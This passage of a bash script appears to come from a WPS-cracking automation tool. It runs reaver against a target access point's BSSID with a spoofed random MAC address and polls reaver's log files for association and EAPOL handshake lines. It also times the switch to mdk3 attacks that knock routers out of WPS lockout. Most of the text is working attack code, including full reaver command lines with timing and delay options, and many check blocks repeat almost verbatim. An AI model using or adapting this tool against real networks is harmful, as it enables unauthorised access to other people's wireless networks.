	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi
##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi


echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"
echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver2" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################


if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi


echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1	

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

#######################

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver3" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -S -vv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################


if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

###################

